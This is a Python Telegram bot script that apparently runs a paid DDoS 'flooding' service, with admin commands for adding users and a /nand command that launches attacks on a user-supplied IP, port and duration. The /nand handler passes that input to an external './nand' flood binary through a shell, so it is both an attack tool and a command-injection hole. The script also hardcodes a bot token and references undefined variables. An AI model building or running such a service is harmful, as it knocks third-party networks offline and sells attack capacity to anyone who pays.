import telebot
import subprocess
import datetime
import os
import random

# Insert your Telegram bot token here
bot = telebot.TeleBot('7942123478:AAEsUwOMYIvrZKmpbnqA1JAAH3UQpzyOilE')

# Admin user IDs
admin_id = {"7990474206"}

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# Random Video URLs
VIDEO_URLS = [
    "https://envs.sh/oQ7.mp4",
    "https://envs.sh/mc2.mp4",
    "https://envs.sh/mcd.mp4"
]

def send_video_with_caption(chat_id, caption):
    """Random video bhejne ka function"""
    video_url = random.choice(VIDEO_URLS)
    bot.send_video(chat_id, video=video_url, caption=caption)

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass

allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")


# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found ."
            else:
                file.truncate(0)
                response = "Logs cleared successfully "
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                response = f"User {user_to_add} Added Successfully ."
            else:
                response = "User already exists ."
        else:
            response = "Please specify a user ID to add."
    else:
        response = "ONLY OWNER CAN USE."

    bot.reply_to(message, response)



@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} removed User"
            else:
                response = f"User {user_to_remove} not found in the list ."
        else:
            response = ''' Usage: /remove <userid>'''
    else:
        response = "ONLY OWNER CAN USE."

    bot.reply_to(message, response)


@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found ."
                else:
                    file.truncate(0)
                    response = "Logs Cleared Successfully "
        except FileNotFoundError:
            response = "Logs are already cleared ."
    else:
        response = "ONLY OWNER CAN USE."
    bot.reply_to(message, response)

 

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found "
        except FileNotFoundError:
            response = "No data found "
    else:
        response = "ONLY OWNER CAN USE."
    bot.reply_to(message, response)


@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found ."
                bot.reply_to(message, response)
        else:
            response = "No data found "
            bot.reply_to(message, response)
    else:
        response = "ONLY OWNER CAN USE."
        bot.reply_to(message, response)


@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"Your ID: {user_id}"
    bot.reply_to(message, response)

# Function to handle the reply when free users run the /nand
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"Flooding Started : {target}:{port} for {time}\nAttack Running Don't put same ip port\n\nREGARDS - @TMZEROO✅"
    bot.reply_to(message, response)

    # Dictionary to store the last time each user ran the /nand command
nand_cooldown = {}

COOLDOWN_TIME =0

# Handler for /nand command
@bot.message_handler(commands=['nand'])
def handle_attack(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        if user_id not in admin_id:
            if user_id in nand_cooldown and (datetime.datetime.now() - nand_cooldown[user_id]).seconds < 3:
                response = "🚫 | <b>ʏᴏᴜ ᴀʀᴇ ᴏɴ ᴄᴏᴏʟᴅᴏᴡɴ</b> | 🚫\n\n🕒 ᴡᴀɪᴛ 5 ᴍɪɴᴜᴛᴇs ʙᴇғᴏʀᴇ ʀᴜɴɴɪɴɢ /nand ᴀɢᴀɪɴ!"
                send_video_with_caption(message.chat.id, response)
                return
            nand_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:
            target, port, time = command[1], int(command[2]), int(command[3])
            if time > 300:
                response = "⚠️ | <b>ᴇʀʀᴏʀ:</b> ᴛɪᴍᴇ ɪɴᴛᴇʀᴠᴀʟ ᴍᴜsᴛ ʙᴇ ʟᴇss ᴛʜᴀɴ 300 sᴇᴄᴏɴᴅs. | ⚠️"
                send_video_with_caption(message.chat.id, response)
            else:
                record_command_logs(user_id, '/nand', target, port, time)
                log_command(user_id, target, port, time)

                # 🔥 **Attack Start Message**
                start_message = f"""
┌───🚀 <b>ғʟᴏᴏᴅɪɴɢ sᴛᴀʀᴛᴇᴅ</b> 🚀───┐  

🎯 <b>ᴛᴀʀɢᴇᴛ:</b> <code>{target}</code>  
📍 <b>ᴘᴏʀᴛ:</b> <code>{port}</code>  
⏳ <b>ᴅᴜʀᴀᴛɪᴏɴ:</b> <code>{time} sᴇᴄᴏɴᴅs</code>  

🔄 ᴀᴛᴛᴀᴄᴋ ɪs ʀᴜɴɴɪɴɢ, ᴅᴏɴ'ᴛ ʀᴇᴘᴇᴀᴛ ᴛʜᴇ sᴀᴍᴇ ɪᴘ/ᴘᴏʀᴛ.  

🔥 ʀᴇɢᴀʀᴅs - @TMZEROO✅

└──────────────────────────┘  
"""
                send_video_with_caption(message.chat.id, start_message)

                # **Attack Execution**
                full_command = f"./nand {target} {port} {time}"
                subprocess.run(full_command, shell=True)

                # 🎯 **Attack Finish Message**
                finish_message = f"""
┌───✅ <b>ғʟᴏᴏᴅɪɴɢ ᴄᴏᴍᴘʟᴇᴛᴇ</b> ✅───┐  

🎯 <b>ᴛᴀʀɢᴇᴛ:</b> <code>{target}</code>  
📍 <b>ᴘᴏʀᴛ:</b> <code>{port}</code>  
⏳ <b>ᴛɪᴍᴇ:</b> <code>{time} sᴇᴄᴏɴᴅs</code>  

⚡ ᴛʜᴇ ᴀᴛᴛᴀᴄᴋ ʜᴀs ғɪɴɪsʜᴇᴅ!  
🔄 ᴜsᴇ /nand ᴀɢᴀɪɴ ᴡʜᴇɴ ɴᴇᴇᴅᴇᴅ.  

🔥 ʀᴇɢᴀʀᴅs - @TMZEROO✅

└──────────────────────────┘  
"""
                send_video_with_caption(message.chat.id, finish_message)

        else:
            response = "📌 | <b>ᴜsᴀɢᴇ:</b> /nand <ᴛᴀʀɢᴇᴛ> <ᴘᴏʀᴛ> <ᴛɪᴍᴇ> | 📌"
            send_video_with_caption(message.chat.id, response)
    else:
        response = "❌ | <b>ᴀᴄᴄᴇss ᴇxᴘɪʀᴇᴅ ᴏʀ ᴜɴᴀᴜᴛʜᴏʀɪᴢᴇᴅ</b> | ❌\n\n⚠️ ʙᴜʏ ɪᴛ ғʀᴏᴍ @TMZEROO!"
        send_video_with_caption(message.chat.id, response)


# Add /mylogs command to display logs recorded for nand and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = " No Command Logs Found For You ."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "You Are Not Authorized To Use This Command ."

    bot.reply_to(message, response)


@bot.message_handler(commands=['help'])
def show_help(message):
    help_text ='''
/nand : for attack
/AllCmd : All Commands.
'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''[ Flooding not running ]\n         get > /help 
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['AllCmd'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Admin Commands Are Here!!:

 /add <userId>
 /remove <userid>
 /broadcast
'''
    bot.reply_to(message, response)


@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "Message To All Users By Admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users ."
        else:
            response = " Please Provide A Message To Broadcast."
    else:
        response = "ONLY OWNER CAN USE."

    bot.reply_to(message, response)




#bot.polling()
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
